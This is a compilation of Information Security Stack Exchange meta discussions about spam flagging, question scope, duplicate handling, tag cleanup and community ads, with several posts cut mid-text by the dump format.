<p>An important corollary is that sock-puppet detection systems won't be triggered if you behave ""ethically"", since they concentrate on vote-related actions.</p>

<p>If you do maintain several accounts on a single site, then it is simpler never to vote with any of the ""secondary"" accounts.</p>

<p>On distinct SE sites, do as you wish. You can keep them as separate as you want to.</p>

<ul>
<li>Heavily promoted a single product, service, or vendor.</li>
<li>Contained multiple links to a commercial site, matching common <a href=""http://en.wikipedia.org/wiki/Search_engine_optimization"" rel=""nofollow noreferrer"">SEO</a> patterns.</li>
<li>Contained little or no direct technical information within the post body.</li>
<li>Consisted, primarily, of a call-to-action to visit the aforementioned sites.</li>
</ul>

<p>There were also other issues with your answers which were not specific to spam, but were indicative of abnormal behaviour:</p>

<ul>
<li>The two offending answers were literally identical.</li>
<li>You linked to another answer of yours on Unix SE, which also heavily backlinked to the same vendor, though which did contain more technical details. This is usually done by people who are trying to farm reputation, rather than spammers.</li>
</ul>

<p><strong>That being said</strong>, it doesn't mean you <em>are</em> a spammer. Your behaviour was indicative enough for you to be concerning, but the fact that you replied and the fact that some basic osint shows you're probably not an employee means you're (probably) off the hook on this one. However, it is customary when recommending a commercial solution to explicitly and transparently state any affiliation you have with the vendor, paid or otherwise. I would suggest you caveat all of your future answers that reference Linphone as such.</p>

<p>As for what happened to your answers, they have been soft-deleted and can only be read by 10k+ reputation users who explicitly view the revision history. This is a safety measure to prevent gaming of the SE system by spammers.</p>

<p>For transparency, I'll quote the answers you gave (sans links):</p>

<blockquote>
  <p>You can use Linphone to place secure calls. It supports:</p>
  
  <ul>
  <li>HD Audio and video call</li>
  <li>Secure communications (TLS, SRTP, zRTP)</li>
  </ul>
  
  <p>You would need to use a SIP service that supports authenticating and
  transporting traffic through TLS (not all do), like Linphone SIP
  service or Ostel.</p>
  
  <p>For detailed instructions on how to set up secure calls with Linphone

</blockquote>

<p>As a closing word on the matter, I'd like to point out that these measures are taken to ensure that StackExchange is a good resource for solving technical (and non-technical) problems for everyone. It is better to err on the side of caution and have a few false positives with these things than it is to let spammers run riot. Signal to noise ratio is critical in making StackExchange useful.</p>

<p>If you <em>were</em> literally just posting about a solution that you had experience with, then I'm sorry you got flagged incorrectly, but I hope you understand that it wasn't intended to be an attack on you specifically. We like people to stick around, enjoy themselves, and contribute quality answers, which is one of the reasons we take abusive behaviour so seriously.</p>

<p>Since this will obviously be biased in my favor, I will start instead with all the <em>reasons to close:</em></p>

<ul>
<li><p>Help center defines the ""IT Security Stack Exchange [as] being for Information Security professionals to discuss protecting <strong>assets</strong> from threats and vulnerabilities."" </p>

<p>This prompts the question, ""is personal location data an <strong>asset</strong> (as defined within the help center)?""</p>

<ul>
<li><strong>No:</strong> Assets include any property owned by a company, including intellectual property, customer data, patented materials, etc. (i.e. anything that can cause <em>the company you are working for</em> to lose money, sales, or customers.)</li>
<li><strong>Yes:</strong> Assets are any type of information that can cause a company <em>or</em> individual to lose an amount of money. Additionally, assets are information that could be used to cause harm or harassment to an <em>individual or company.</em></li>
</ul></li>
</ul>

<p>I think it will be good to mention here that <strong>leading this site to strictly favor one-side and not the other does not give this site the opportunity to grow into it's full potential.</strong> ITsec has always been about both, after all it is <em>the individuals that make up the larger company entity anyways.</em> Individuals can and always have had interest in protecting their personal information and data.</p>

<p>Trying to protect the corporate entity against theft and revenue loss, while turning your back on the individual who lost his identity due to a public Wifi hotspot does not progress IT security understanding and research—it deteriorates it.</p>

<blockquote>
  <p><strong>Side Note – Reluctance to acknowledge Individual-based problems as being on-topic:</strong> I know as well as anybody who's worked in sales knows — we don't want the general public banging on the door. Please know I don't mean for this to affect the <em>quality</em> requirement for questions or the ""some personal effort put in to finding the answer first"" requirement; those rules, as always, still apply.</p>
</blockquote>

<ul>
<li><strong>It's <em>possibly</em> illegal.</strong> It's not. First off,
<ul>
<li><strong>There is no law on the books (in USA) that specifically protects a law enforcement officer's or repo driver's rights to collect such data.</strong> Even more specifically, no law exists that prohibits my (still theoretical) devices from being used to protect against dragnet data-mining attacks.</li>
<li><strong>Laws for similar devices favor it.</strong> <a href=""http://www.radarbusters.com/State-Radar-Detector-and-Laser-Jammer-Laws-s/2412.htm"" rel=""nofollow"">Radar detectors</a> notify the driver that he is being scanned by a police radar gun, giving him time to slow down before the gun gets a ""lock,"" which would give the officer cause to pull him over. For <strong>Laser scanners</strong>, the counterpart is a laser detector/jammer combo: If it picks up signal from a police laser gun, it sends out tons of ""garbage"" laser messages back — essentially confusing the gun and preventing a lock. These have been legal to own and operate for decades, except in D.C. and Virginia.</li>
<li>The Bill of Rights in my county (set of laws defining rights' protection for every citizen) <a href=""http://law2.umkc.edu/faculty/projects/ftrials/conlaw/rightofprivacy.html"" rel=""nofollow"">implicitly protects an individual's liberties and rights to privacy.</a> Even if the law does not explicitly include privacy in the list of protections, that's <em>one Supreme Court case and a lot of media attention</em> away from changing.</li>
<li>Discussing the legal merits any further than this (for cases undecided) on the <strong>IT Sec</strong> Stack Exchange is the wrong place to do it. We all know how firewall rules work around here, right?: No explicit deny rule, matches an existing pass rule, <em>all is well in the kingdom</em>.</li>
</ul></li>
</ul>

<p>So, if we've agreed that there's <em>not enough evidence</em> to support the claim that building and operating one of these (still theoretical) devices breaks any laws; and that the Security of Personal Information is within the scope of the Information Security board; then what other reasons for closing remain? The only I can think of:</p>

<ul>
<li><strong>It's unjust to interfere with Law Enforcement / Morality &amp; Ethics:</strong> This is a debate that could last for days, so I'll just touch lightly on it — will this even still be a debate when it's discovered smartphone backdoors are leaking <em>everyone's personal location data</em> to LE servers in plaintext to be stored for several years? You should know it's going to be tried soon—if it's not already happening.</li>

1667,2,2014-10-10T05:53:49.590,3,,"<p>I noticed you got only a limited answer, so I'll share my reaction.</p>

<p>I don't know.  This doesn't sound related to <em>Information</em> Security, and I'm not sure you can expect people on this site to have relevant expertise.  That said, I'm not sure.  I'm not convinced it is off-topic for the site.  I'm not sure it should have been closed for that reason.  If the question was otherwise suitable, I would consider voting to re-open.</p>

<p>However, right now it is subjective and largely opinion based.  It asks ""What is the best way to...?""  Generally, this wording makes it hard to evaluate answers and pick a single correct answer, so it makes the question not an ideal fit for this site.  (I realize this is highly counter-intuitive.  For what it's worth, it tripped me up when I first joined StackExchange.)</p>

<p>As a result, I think closing this question was appropriate, and as it currently stands it is not in a shape suitable for a vote to re-open.</p>

<p>If you would like to see the question considered for re-opening, you can edit the question to improve it.  Here are the edits I would recommend:</p>

<ul>
<li><p>Instead of asking for ""the best way"", it's usually better to list the evaluation criteria you will use to evaluate answers.  Are there some hard requirements?  Some metrics?  What options have you considered and rejected?  This will help you craft a more focused, objective question.</p>

<p>For instance, maybe you aren't looking for the ""best"", ""cleanest"" way to defend yourself.  Maybe you are just looking for a practical way to defend yourself.  If so, ask for that.</p></li>
<li><p>Also, try to stick to one question per question.  Right now you ask two questions: What's the best way to defend yourself?  Would an IR light work?  That's two questions.  Admittedly, they are closely related, but you might do better to focus on just one, or ask them separately.  Right now, I can imagine an answer that says ""No, an IR light wouldn't work (for such-and-such reason).""</p></li>
<li><p>Lastly, show your research.  Keep in mind that, as <a href=""https://security.stackexchange.com/help/on-topic"">the help center states</a>, ""IT Security Stack Exchange is for Information Security professionals"".  The more you show that you have done detailed research, and can show that there is technical depth to the question, the greater the chances that it will be suitable.</p></li>

1673,1,2014-10-30T14:16:00.100,4,68,"<p>There are a lot of questions on Sec.SE that are duplicates, or, at least: near duplicates.</p>

<p>For example, <a href=""https://security.stackexchange.com/questions/71905/how-to-report-vulnerabilities-without-being-regarded-as-a-hacker"">this question</a> has a lot of attention, and no mention of duplicates. Although it's similar to <a href=""https://security.stackexchange.com/questions/52/how-to-disclose-a-security-vulnerability-in-an-ethical-fashion/68#68"">this much older question</a> and I expect many other similar questions have been asked. A common theme is also seen in <a href=""https://security.stackexchange.com/questions/71990/why-are-drives-overwritten-three-times-when-being-disposed-of"">this question</a>, where the question has some particular twist that makes it not-quite-a-dupe.</p>

<p>I think the problem is a bit deeper than people not bothering to look for duplicates. It's hard to find duplicates using search, because people don't always use search-friendly keywords. e.g. a search for ""responsible disclosure"" does not match ""how do i report a vulnerability?"" And when you do find duplicates, often the answers are only moderate quality, that doesn't answer all the nuances of the subject.</p>

<p>If we really wanted to fix this, we could work harder to create canonical questions with great answers, and tags that help them show up in searches. We could then more aggressively mark near-dupes as duplicates, potentially even editing the answers to cover the near-dupe questions. This would greatly improve the mission of letting people find good answers in web searches.</p>

<p>Maybe this is something that people don't mind. It's not necessarily a bad thing to have duplicate questions on the site. And you get more rep from a couple of upvotes on a dupe answer than you do for a close vote. But general Stack Exchange policy is to close duplicates, and we should really follow that.</p>

<p>It seems many people are being penalized with downvotes / question closures (including myself) for asking questions about which security tools we should use for task x (e.g. log file review).  Although I read the tour page, I did not see any reason to not ask such a question.</p>

<p>Here is a question about this in meta:
<a href=""https://security.meta.stackexchange.com/questions/1595/asking-about-software-solutions"">Asking about software solutions</a></p>

<p>Here is an example question that has been penalized (downvoted):

<p>Another example: my question about good log file review tools was downvoted, closed, then deleted, with the reason given that these questions tend to go out of date quickly.  I began to delete it myself when the downvotes and closure were applied, but was warned that I should not delete a question with answers applied, so then I did not delete it.</p>

<p>I personally believe such questions add value (e.g. someone can see what good log file review tools are).  Perhaps to resolve the questions being out of date, the reader of the question can see when the answers were provided and judge whether or not it is still valid, and even provide a new list of tools when the old list is sufficiently outdated.</p>

<p>As an example, I may really like tool X. Someone else may hate it and prefer tool Y, which I think is terrible.</p>

<p>How would you decide which is correct for you from that info?</p>

<p>We already have two great pages for what you <a href=""https://security.stackexchange.com/help/on-topic"">should</a> and <a href=""https://security.stackexchange.com/help/dont-ask"">shouldn't ask</a>, and this is covered well: </p>

  <p>To prevent your question from being flagged and possibly removed, avoid asking subjective questions where …</p>
  
  <ul>
  <li>every answer is equally valid: “What’s your favorite ______?”</li>
  <li>your answer is provided along with the question, and you expect more answers: “I use ______ for ______, what do you use?”</li>
  <li>there is no actual problem to be solved: “I’m curious if other people feel like I do.”</li>
  <li>you are asking an open-ended, hypothetical question: “What if ______ happened?”</li>
  <li>your question is just a rant in disguise: “______ sucks, am I right?”</li>
  </ul>
</blockquote>

<p>As an aside, fanatical devotion to a particular tool does happen a lot in the security testing industry. Often with no real basis, as an objective viewpoint shows that many tools are broadly as bad/good as each other and in fat are best used together to minimise specific false positives/negatives.</p>

<p>I encourage everyone to do a sweep through tags and identify commonly-asked question. If there's a thread with a good set of generic answers, link it in the tag wiki. If there isn't, write a good Q&amp;A pair or call on meta or chat for someone to write one.</p>

<h3>What are Community Promotion Ads?</h3>

<p>Community Promotion Ads are community-vetted advertisements that will show up on the main site, in the right sidebar. The purpose of this question is the vetting process. Images of the advertisements are provided, and community voting will enable the advertisements to be shown.</p>

<h3>Why do we have Community Promotion Ads?</h3>

<p>This is a method for the community to control what gets promoted to visitors on the site. For example, you might promote the following things:</p>

<ul>
<li>cool security related open source apps</li>
<li>the site's twitter account</li>
<li>cool events or conferences</li>
<li>anything else your community would genuinely be interested in</li>
</ul>

<p>The goal is for future visitors to find out about <em>the stuff your community deems important</em>. This also serves as a way to promote information and resources that are <em>relevant to your own community's interests</em>, both for those already in the community and those yet to join. </p>

<h3>Why do we reset the ads every year?</h3>

<p>Some services will maintain usefulness over the years, while other things will wane to allow for new faces to show up. Resetting the ads every year helps accommodate this, and allows old ads that have served their purpose to be cycled out for fresher ads for newer things. This helps keep the material in the ads relevant to not just the subject matter of the community, but to the current status of the community. We reset the ads once a year, every December.</p>

<p>The community promotion ads have no restrictions against reposting an ad from a previous cycle. If a particular service or ad is very valuable to the community and will continue to be so, it is a good idea to repost it. It may be helpful to give it a new face in the process, so as to prevent the imagery of the ad from getting stale after a year of exposure.</p>

These watermarks are usually invisible, but perhaps they need not be, if all they do is to act as your ""signature.""</p>

<p>There is a penalty for deleting questions. I believe that the penalty does not apply (or at least is lessened), if the deletion takes place more than 30 days after the question was posted. That is, ""low rep"" individuals who have a bunch of questions deleted before 30 days will be automatically ""questioned-banned"" from the site. If the questions are deleted after 30 days, the penalty is lessened or removed.</p>

<p>That would not apply to you, with your high rep, and as said, the stricture is less after 30 days.</p>

1714,2,2015-02-05T11:09:35.590,4,,"<p>On the reopening status, I can't see why the previous question has been closed, but let me guess on ""too broad"". </p>

<p>I think the newest question might still be broad. Watermarking encompasses a lot of concepts, some of them having ties to security. </p>

<p>You might want to search a bit more on the subject to refine what you are having as problem. Let me give you some clues on the vocabulary:</p>

<p>Watermarking can be <strong>robust</strong> or <strong>fragile</strong>. Robust watermarking are meant to resist tampering (or altering, it's the same thing to me). This means that the mark would be inserted in a way that modifications on the media does not destroy it, or that the mark can be recovered using redundancy for example. If the watermark is fragile, this means that any modification will make the mark disappear. The robust-fragile property is a scale and you can find watermark that are semi-fragile (resisting different modifications) or XX-robust (jpeg-robust, ...).</p>

<p>Watermarking can be <strong>visible</strong> or <strong>invisible</strong>. The former being a ""TV""-logo image on the bottom-left of the screen (for example) and the latter being a hidden code.</p>

<p>And more properties... (blind, informed, ...)</p>

<p>All these properties usually are tied together as making a mark robust will usually translate in stronger modification on the image, thus making the mark visible.</p>

<p>The security feature of watermarking depends on the application. For example, a DRM-protection will use a robust watermarking scheme, visible or invisible, but a watermarking meant to serve as proof by assessing non modification of an image will be fragile (any modification voids the proof by destroying the mark).</p>

<p>Anyway, I suggest you:</p>

<ul>
<li>identify your application first (what are you trying to use watermarking for, is it DRM, identification or authentication)</li>
<li>define your field of operation (what kind of media, what kind of message)</li>
<li>what do you want to be protected against. </li>
</ul>

<p>From there, there are a lot of things you can do with watermark. Most of the techniques can be found within the image processing community. Since I have this at hand's reach, let me share an extract of my bibliography (I do not guarantee full access to all these docs):</p>

It's not uncommon to have question that are mis-tagged, whether it's non relevant tags, redundant or meta-tags. On SE, we do not like 'meta-tag' as they do not provide information on the content of a question (see Jeff's <a href=""http://blog.stackoverflow.com/2010/08/the-death-of-meta-tags/"">blog post</a>). </p>

<p>So every now and then we proceed to the cleaning of these meta-tag. So as not to overwhelm the front page with activity from old question, this cleaning has to be coordinated. We are thinking of one tag a day.</p>

<p>Seems like a good way to me. Though I'm not convinced whether it's warranted: the context already makes it apparent that the link is to potentially malicious content, and merely clicking on a link should not cause problems anyway. Ok, so people click by mistake and browsers are buggy, so it's not a bad idea to make the link harder to click.</p>

<p>No, and no. Most links to malicious content should be removed. Only a few links to malicious content are useful to have, it's not worth creating a site feature for this.

<p>I think that often it's not very clear where the line is between on- and off-topic with these kinds of questions.</p>

<p>It seems that the main purpose of this close reason: </p>

<blockquote>
  <p>Questions asking us to break the security of a specific system for you are off-topic unless they demonstrate an understanding of the concepts involved and clearly identify a specific problem.</p>
</blockquote>

<p>is to avoid script kiddies, to avoid questions of the type <code>how to hack website X</code>, and to avoid questions which are only relevant to this code, and this code alone.</p>

<p>A clarifying post here might help to handle these kinds of questions more uniformly. </p>

<p>You get the idea. Some might be duplicates of others, some handle very specific edge cases, but I can't really see a pattern for how these questions are handled, it seems very random. [the questions are from different years, but that also doesn't seem to play a role.]</p>

<p>I don't think the difference is that some <code>demonstrate an understanding of the concepts involved</code> and some don't. One problem seems to be that this is rather vague.</p>

<p>Another problem seems to be the meaning and intention behind the close reason <code>break the security of a specific system for you</code>. What is a specific system? A website? A piece of software? Code that is only used by the OP, but nowhere else?  </p>

<p>So I think it would be good to clarify:</p>

<ul>
<li>how does one <code>demonstrate an understanding of the concepts involved</code>? And is this really a good part of the close reason?</li>
<li>what exactly is meant by <code>break the security of a specific system for you</code>?</li>
<li>in general, are questions like <code>here is my code/filter[, i tried x and y, but for reason z that doesn't work]. how to exploit this?</code> on-topic or off-topic? And when/why is this the case?</li>

1761,2,2015-04-10T04:50:42.047,7,,"<p>I'm seeing some trends in the questions you highlighted (I know it is a small sample set). </p>

<ol>
<li>The OP admits he doesn't know about SQLi - the duplicate question might not answer the question as asked, but provides the background he needs to know</li>
<li>Is from 3 years ago, just basic code review, left open because a legacy question</li>
<li>is from 2.5 years ago and would likely be closed if asked now, just basic code review</li>
<li>is an ""exercise"" and the OP doesn't have access to the server - classic ""help me hack this""</li>
<li>is from 1.5 years ago and would likely be closed if asked now, just basic code review</li>
<li>is 4 months old, closed, just basic code review</li>
<li>is new and the OP doesn't have access to the server - classic ""help me hack this""</li>
<li>is more about a regex interpretation - different from ""help me interpret my own operational code"" - I believe this is valid to leave open</li>
<li>OP admits that it is a ""challenge question"" - doesn't show how far he came on his own</li>
<li>2 years old - more of a regex interpretation</li>
<li>is new and shows zero understanding or research of the very simple problem</li>
</ol>

<p>What I'm seeing in the sample set is that, yes, older questions were left open, but the community has shifted and is getting weary of the ""code review"" type of questions (especially since there is now a forum for that). Homework/challenge questions are closed quickly. Regex questions get people excited to solve the puzzle so they stay open even if they should be closed. </p>

<p>But how do we approach new questions better? I'd say that the ambiguity of the phrase ""break the system for you"" is ok because it covers a wide range of valid things. </p>

<p>Demonstrating an understanding is key. I, personally, am weary of having to handle questions when I find the answer in a Google query using the question's very own subject line. Those questions become low quality noise. </p>

<p>I, personally, would leave open a question that said <code>Here is my code/filter, I tried x and y, but for reason z that doesn't work. I've read a and b, but I am no further in reaching an answer. What am I missing?</code> and the code sample was not an entire operational code set (like the whole authentication code block). The question is targeted, the problem is constrained, and the OP displays that he did more work than simply copy/pasting his entire program in a question to us.</p>

<p>The moderators put it ""On Hold"", because the quality of the question indicated (accurately) that I am not a security professional (I am a humble programmer), and therefore my question was too vague and showed no prior research.</p>

<p>All true.</p>

<p>But as a lay person who has only a surface appreciation of security issues, what then is the correct forum for me to ask such a question?  In this case, I truly do not understand the fine distinctions within the field of biometrics or identity theft, that I could ask a more focused question, or do any preliminary research.  So I asked the general noob question, and I got a lot of answers that I found very helpful to my understanding.  And then the question attracted so much attention that it got shut down.</p>

<p>So, given that I asked a dumb noob question and got a lot of value out of the answers, I'm very happy that I came to Security.SE.  It just leaves something of a bad taste that in shutting down my question, the moderators are effectively telling me I'm not welcome here.</p>

<p>So I wish to clarify: is Security.SE only for the elite people in the Know?  And if so, where else should people like me go to get their questions answered?</p>

<p>Secondly, there is nothing that says <strong>anywhere</strong> that this was closed because you were a 'noob' or not professional. </p>

<p>The problem with is, and various commenters tried to explain to you, is that <strong>the question is too broad</strong>. This is why it was closed, and the close reason gives links to the help centre so you can see what you might need to do to improve it. And upvotes are not an indicator of whether something is on- or off-topic. Especially if something ends up on the Hot Questions list - upvotes then come from individuals all over the network, so are not necessarily related to our site.</p>

<p>If you look at the multitude of other biometric questions we have on the site you will see some of the risk calculations you should be aware of.</p>

<p>We encourage questions from anyone who has a problem that fits within scope, and who can write the question to be answerable. This does not require any security knowledge, although it does help if you have a little.</p>

1774,2,2015-04-19T13:19:04.963,26,,"<p>To complement what @Rory says, I'd like to point out that there is no rule that says that <em>any</em> question fits somewhere in the StackExchange network. By design, the SE sites concentrate on questions that can be answered in about one page of text. Of course, longer answers exist, because <em>some people</em> tend to exhibit a larger than average level of verbosity, given the occasion. However the general point remains: if a question is ""too broad"" then it is too broad <em>everywhere</em>; i.e. there is no such thing as a ""correct forum"" within the SE sites for such a question.</p>

<p>This implies that while the SE sites are a great source of detailed information, they cannot really cover the Big Questions that have a large scope. These must be handled somewhere else; the Internet is a large place.</p>

<p>Unfortunately, asking for pointers to introductory information on a broad subject, the very thing you need to make that ""preliminary research"", happens not to be a good fit for an SE site either, for different reasons. It is not that SE people don't consider such questions invalid, or too noobish; it just is that experience shows that they don't mix well with the dynamics of the SE sites as they operate today. Personally, when I try to imagine how would work a site that <em>can</em> help people understand these ""too broad questions"" or at least direct them to appropriate resources, well, it no longer looks like a Web site; rather like a university library.</p>

Renaming the tag to <a href=""https://security.stackexchange.com/questions/tagged/sha3"" class=""post-tag"" title=""show questions tagged &#39;sha3&#39;"" rel=""tag"">sha3</a> would be typographically incorrect (it's “SHA-3”, not “SHA3”) and would not help you.</p>

<p>There is the question of to what extent we want tags for specific hash functions. A majority of questions on this site (unlike <a href=""https://crypto.stackexchange.com/"">Cryptography</a>) involving hashes are about using a cryptographic hash to ensure the integrity of some data and not about a specific hash function. However, there are questions where the specific hash function is relevant, so these tags are sometimes warranted, but not everywhere they're currently used.</p>

<p>There are currently 4 questions tagged <a href=""https://security.stackexchange.com/questions/tagged/sha-3"" class=""post-tag"" title=""show questions tagged &#39;sha-3&#39;"" rel=""tag"">sha-3</a>. They're about moving to SHA-3 from SHA-2, so the tag is relevant.</p>

Some of these are about the known security problems with MD5 and whether they affect a system using them (<a href=""https://security.stackexchange.com/questions/23116/md5-collision-attacks-are-they-relevant-in-password-hashing"">example</a>); the tag is very much warranted there. Others are about hashes in general (<a href=""https://security.stackexchange.com/questions/25309/password-salts-and-randomness"">example</a>) and should not have a tag for a specific hash.</p>

<p><a href=""https://security.stackexchange.com/questions/tagged/sha1"" class=""post-tag"" title=""show questions tagged &#39;sha1&#39;"" rel=""tag"">sha1</a> (which should be <a href=""https://security.stackexchange.com/questions/tagged/sha-1"" class=""post-tag"" title=""show questions tagged &#39;sha-1&#39;"" rel=""tag"">sha-1</a>) is currently synonymized to <a href=""https://security.stackexchange.com/questions/tagged/sha"" class=""post-tag"" title=""show questions tagged &#39;sha&#39;"" rel=""tag"">sha</a>.

As SHA-2 is the “default” hash family these days, most of these questions should really just be tagged <a href=""https://security.stackexchange.com/questions/tagged/hash"" class=""post-tag"" title=""show questions tagged &#39;hash&#39;"" rel=""tag"">hash</a>.</p>

<p>When searching Meta, I've found <a href=""https://security.meta.stackexchange.com/questions/422/building-our-own-migration-list"">older posts</a> dealing with the creation of this list during the Beta era, but nothing explaining the reason behind this limitation.</p>

<p>I'm a little confused because because NPAPI has been a known threat and attack vector for years.  The question was related to whether or not Mozilla had any roadmaps </p>

<p><strong>What background should I give in my question?</strong></p>

<p>I'm confused here too.  I linked to relevant news articles discussing what's going on for google Chrome and Microsoft's future Spartan release.  </p>

<p><strong>What topics can I ask about here?</strong></p>

<p>Here I was a little naughty... I should have talked a little about how NPAPI exposes browsers to severe information leakage and outright compromise.  </p>

<p>It was expressed in the single comment that the lifespan of the question was ""too short,"" when at least according to <a href=""https://security.stackexchange.com/help/on-topic"">2</a>, there is no mention of lifespan in nor <a href=""https://security.stackexchange.com/help/dont-ask"">here.</a> Even scouring <a href=""https://security.stackexchange.com/help/how-to-ask"">this help page</a>, there is no mention of time-value.  However, even if there were mention of it, lets say that OWASP decides to formally kill something like OWASP's ESAPI.  (It could happen, there hasn't been a minor release since Sep. 2013.)  It seems like this information would at least be valuable as a wiki that future questions could be referred to.  </p>

<p>The time-value thing seems spurious:  <a href=""http://en.wikipedia.org/wiki/C%2B%2B11#Features_removed_or_deprecated"" rel=""nofollow noreferrer"">Languages deprecate features all the time.</a>  Does that invalidate someone's question on SO in regards to K&amp;R C?  Browsers deprecating dangerous APIs seems like an extremely worthy question.  I've worked in environments within the last year that were required to support IE7.  NPAPI deprecation may be relevant to future askers looking for reasons to argue against supporting particular browser versions.  </p>

<p>The biggest criticism I think I can have for my question is that the answer might not come for several months. But we offer badges for precisely that kind of thing:  <a href=""https://security.stackexchange.com/help/badges/44/necromancer"">Answering an old unanswered question.</a> At any rate, if we're going to make ""time-sensitivity"" a criteria to close questions, I think we ought to modify our help documentation to make that clear.

A lot of questions on this site get moved out or tend to be duplicates more so then something with more of a support feel like Stack Overflow or Super User.</p>

<p>Questions which tend to get high votes or lots of feedback are those which are on simpler concepts which more people can understand, want to know about, feel comfortable voting up or down, or are going to come up in Google.

<p>Assume that the links you posted are already broken. Now read your question. Is it clear? You should summarize just enough of the offsite content that someone can answer your question without clicking out of this site.</p>

<p>Taking that assumption to heart, this is how you need to think about your questions.  Your unedited question was just this:</p>

<blockquote>
  <p>Is there an exploit for this vulnerability?</p>
</blockquote>

<p>Like I said, assume the links you add are already dead.  They're only there for historical references.  This is a meaningless question.</p>

<p>Later @schroeder added this in an edit:</p>

<blockquote>
  <p>EDIT</p>
  
  <p>Python DoS via hash algorithm collision - oCERT advisory 2011-003.
  Affected numerous languages. No CVE for Python but CVEs for other
  languages.</p>
</blockquote>

<p>Again, assume your link is dead. Now whoever's going to answer this question is going to have to go google what the heck ""CERT advisory 2011-003"" is and hope that they can stumble across something.  </p>

<p>You're putting more work on the answerer than the community deems necessary. Its entirely reasonable for a question like this to go unanswerable for a few years, because you're asking ""is there an active exploit,"" which means your question is ""NO"" until suddenly ""YES.""  Which is another problem with the question.</p>

<p>This is more what your question should look like:</p>

<p>=============================================</p>

<p>From <a href=""http://www.ocert.org/advisories/ocert-2011-003.html"" rel=""nofollow"">this site</a>, multiple languages were specified in a security bulletin including Python:</p>

<blockquote>
  <p>The condition for predictable collisions in the hashing functions has
  been reported for the following language implementations: Java, JRuby,
  PHP, Python, Rubinius, Ruby. In the case of the Ruby language, the
  1.9.x branch is not affected by the predictable collision condition since this version includes a randomization of the hashing function.</p>
</blockquote>

<p>Here were the CVEs listed:</p>

<pre><code>CVE: 
CVE-2011-5034 (Apache Geronimo), 
CVE-2011-5035 (Oracle Glassfish), 
CVE-2011-4461 (Jetty), 
CVE-2011-4838 (JRuby), 
CVE-2011-4885 (PHP), 
CVE-2011-4462 (Plone), 
CVE-2011-5036 (Rack), 
CVE-2011-4815 (Ruby), 
CVE-2011-4858 (Apache Tomcat), 
CVE-2011-5037 (V8 JavaScript Engine)
</code></pre>

<p>Python was listed in the CERT message as shown here, but there was no corresponding CVE written for Python.  Did this fall through the cracks?  Was there a python patch related to this bulletin?</p>

<p>=========================================</p>

<p>This hypothetical version of the question at least lets someone go, download the python code repo and search for commits that were time-correlated to the bulletin in question.  In the best-case, your current form asks ""is there an active exploit"" which is open-ended:  The answer might be NO today, but might be YES later, and what if you accepted an answer that was right today, and that answer goes wrong years from now after you're working as a CEO and don't need this site anymore?  Part of using this site is caring for its future state.</p>

<p>From my perspective as a Security.SE user, this question is on-topic. It's about risk management: deciding when you should roll your own crypto implementation vs using someone else's. I could understand that the question could be considered <em>too broad</em>, but I don't see how it's off-topic in any way. Cryptography is directly relevant to security, and managing risk is the job of a security professional.</p>

<p>From my perspective as a Crypto.SE user, this question is unanswerable — fitting under both <em>primarily opinion-based</em> and <em>off-topic</em>. It isn't about cryptography itself, but about deciding how to go about using it, which is off-topic — it fits the close reason “Questions about security policies that may be based on cryptography (as opposed to the design of cryptographic algorithms and protocols) are off-topic here, but may be asked on Security”. Inasmuch as cryptography is concerned, the only Crypto.SE answer is “if you feel like it”.</p>

<p>I would agree on the tag synonym if HTTPS was widely misused as a synonym for TLS/SSL, but I don't think so. It's better to fix the few questions that do have an incorrect ""https"" tag for a non-HTTP protocol over TLS/SSL, because autofixing all ""https"" tags to ""tls"" means a question about for example a security vulnerability or security rule only applicable for HTTP tunneled over TLS/SSL (for example CRIME or mixed-content rule) would get sorted under same questions to for example SMTP traffic over SSL, and it's not really right.</p>

<p>I still do not understand the choice to transparently make the ""flag"" link to actually cast a close vote instead of a flag once reputation is over 3K. What is the interest of having both a ""close"" and a ""flag"" link if using the ""flag"" link actually cast a vote? It is just confusing to me...</p>

<p>In all case I would think it would be more logical to link such feature to the actual flagging experience of the user. For instance once the user has got the <code>deputy</code> badge (80 helpful flags) then he has enough experience to distinguish what is out of topic and what is not and his flags can therefore be replaced by votes (with the appropriate replacement on the web interface...).</p>

<p>IMHO it does not make any sense to consider that, if a user has written a few good questions/answer, then he should surely also be also good at moderation tasks so <em>lets prevent him from using him the flag button</em> anymore and force him to directly cast close votes instead...</p>

<p>Why the same logic cannot be applied to votes? Why votes are definitive?</p>

<p>I would find normal as a user:</p>

<ol>
<li>To cast a vote stating that, under its current form, is question is for instance unclear or too broad,</li>
<li>If there is no other comments already stating it add a new comment explaining the issue I encounter with his question to the writer.</li>

<p>How to handle the case when the writer edits his question so make it clearer or more focused? I cannot confirm that from my point of view it is now fine and void my vote.</p>

<p>I do not understand why closing votes regarding a question being too broad or unclear <strong>must</strong> persist even when the question has been edited. At this step we should be proposed to remove it...</p>

<p>Maybe such close votes should be used only after one day after the writer has been notified by a comment of the issue if did not edit the message during this delay. Of course this would mean using some kind of self-made personal ""to be voted"" queue...</p>

1819,1,2015-05-25T10:02:24.130,8,121,"<p>A few days ago <a href=""https://security.stackexchange.com/questions/89676/how-to-communicate-a-positive-feeling-about-ethical-hacking-to-non-technical-peo"">there was a question posted</a> by a pupil encountering some issues  due to his security hobby being wrongly perceived by his school administration.</p>

<p>While I easily acknowledge that the initial way the question was formulated was out-of-topic since it was a mix of social/parental/school/hacking, I reformulated it  and its title to focus on a more specific problem specific to IT Security and which I encounter very regularly, which is the very wrong picture that this domain projects in people's mind, and which is the actual root cause of this pupil repetitive exclusions.</p>

<p>Personally, when I encounter non technical people knowing about my researches in this domain, I by far too often face strange reactions, like ""<em>Actually you just seem as a normal person, I thought people like you were all weird geeky guys!</em>"" (which might even more be a positive or negative remark depending on the initial expectation...), ""<em>I know you may not tell me, but did the government already got it touch with you?</em>"", ""<em>Hey buddy, are you sure you cannot do something to reduce my taxes</em>"", etc. There would be numerous other current examples, and I do not even mention my childhood when I was myself a pupil, ""<em>loosing my time in front of a computer</em>"".</p>

<ul>
<li><strong>This issue is real, general and not limited to schools</strong>. It affects judges having to decide about cases implying ""a nasty hacker"", it affects deputies voting anti-hacker laws without having a clue what they are dealing with. Even journalists may be completely phased out, just <a href=""https://www.youtube.com/watch?v=Yis5FWa1gyI&amp;t=438"" rel=""nofollow"">take a look at this french investigation TV show <em>Envoyé Spécial</em></a> who dedicated a program on darknets (2014) and interwied ""<em>one of the sharpest french expert</em>"" who ""<em>handles the electronic security of several companies quoted on the french stock exchanges</em>"". The link should directly bring to the interview, no need to understand french at all to find the staging plain grotesque and ridiculous: how do you reasonably expect people to take IT Security domain seriously with such an image in mind?</li>
